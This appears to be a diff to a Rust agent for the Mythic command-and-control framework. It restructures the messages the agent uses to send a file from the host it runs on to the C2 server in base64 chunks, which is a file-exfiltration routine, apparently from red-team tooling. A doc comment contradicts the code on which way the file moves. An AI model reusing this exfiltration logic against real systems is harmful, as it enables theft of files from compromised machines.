@@ -1,7 +1,7 @@
 use crate::agent::{AgentTask, ContinuedData};
 use crate::mythic_success;
 use crate::utils::unverbatim;
-use serde::Deserialize;
+use serde::{Deserialize, Serialize};
 use serde_json::json;
 use std::error::Error;
 use std::io::Cursor;
@@ -25,6 +25,44 @@ use crate::utils::linux::whoami::hostname;
 struct DownloadArgs {
     /// File to download
     file: String,
+}
+
+/// Response sent for initiating a download
+#[derive(Serialize)]
+struct DownloadResponse<'a> {
+    /// Total chunks in the download
+    total_chunks: usize,
+
+    /// Full path to the file to download
+    full_path: Option<&'a str>,
+
+    /// Host the downloaded file is from
+    host: Option<String>,
+
+    /// Optional extra filename for the file
+    filename: Option<String>,
+
+    /// Whether this download is a screenshot
+    is_screenshot: bool,
+
+    /// Size of each download chunk
+    chunk_size: usize,
+}
+
+/// Information containing the chunk of the file being downloaded
+#[derive(Serialize)]
+struct DownloadChunk<'a> {
+    /// The current chunk being transferred
+    chunk_num: usize,
+
+    /// The file id associated with the download
+    file_id: &'a str,
+
+    /// The base64 encoded data of the file
+    chunk_data: String,
+
+    /// The size of the current chunk
+    chunk_size: usize,
 }
 
 /// Downloads a file from Mythic and places it on the host system
@@ -53,14 +91,23 @@ pub fn download_file(
     // Calculate the total number of chunks which will be sent
     let total_chunks = ((file_len as f64 / CHUNK_SIZE as f64).ceil()) as usize;
 
+    // Metadata for the file download
+    let download_data = DownloadResponse {
+        total_chunks,
+        full_path: Some(&full_path),
+        host: hostname(),
+        is_screenshot: false,
+        chunk_size: CHUNK_SIZE,
+        filename: None,
+    };
+
     // Send the file information up to Mythic for initiating a file download
-    tx.send(json!({
-        "total_chunks": total_chunks,
+    let send_data = json!({
         "task_id": task.id,
-        "full_path": full_path,
-        "host": hostname().unwrap_or_else(|| "".to_string()),
-        "is_screenshot": false,
-    }))?;
+        "download": download_data,
+    });
+
+    tx.send(send_data)?;
 
     // Read in the file data
     let mut file_data: Vec<u8> = Vec::new();
@@ -74,6 +121,7 @@ pub fn download_file(
 
     // Get the response from Mythic containing the file id for tracking
     let task: AgentTask = serde_json::from_value(rx.recv()?)?;
+
     let params: ContinuedData = serde_json::from_str(&task.parameters)?;
     let file_id: String = params
         .file_id
@@ -88,13 +136,18 @@ pub fn download_file(
         let len = c.read(&mut buffer)?;
         let chunk_data = base64::encode(&buffer[..len]);
 
+        // Create the metadata with the chunk of data
+        let chunk_metadata = DownloadChunk {
+            chunk_num: num + 1,
+            chunk_size: len,
+            file_id: &file_id,
+            chunk_data,
+        };
+
         // Send over the response to Mythic
         tx.send(json!({
-            "chunk_num": num + 1,
-            "file_id": file_id,
-            "chunk_data": chunk_data,
             "task_id": task.id,
-            "total_chunks": -1,
+            "download": chunk_metadata,
         }))?;
 
         // Wait until a message is received from Mythic and continue
